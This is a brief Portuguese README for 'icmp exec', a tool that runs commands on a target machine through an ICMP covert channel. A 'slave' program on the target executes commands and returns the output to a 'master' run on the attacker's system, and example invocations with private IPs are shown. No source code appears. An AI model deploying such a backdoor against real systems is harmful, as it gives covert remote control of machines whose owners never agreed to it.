# icmp exec

	Executa comandos na maquina alvo utilizando o protocolo ICMP
	para controlar a saída e entrada de comandos.

# Escravo:
	O escravo deve ser executado na maquina alvo e é responsável
	por executar o comando e enviar a saída para o mestre.

	Deve ser executado da seguinte forma: ./escravo [IP DE ORIGEM]
	Onde 'IP DE ORIGEM' é o IP da maquina mestre, de onde vai vim
	os comandos que devem ser executados.

	./escravo 10.0.0.11

# Mestre:
	O Mestre deve ser executado no sistema do atacante e é responsável
	por enviar o comando para a maquina alvo.

	Deve ser executado da seguinte forma: ./mestre [ALVO]
	Onde 'ALVO' é o endereço da maquina escravo, para onde vai ser
	enviados os comandos.

	./mestre 10.0.0.10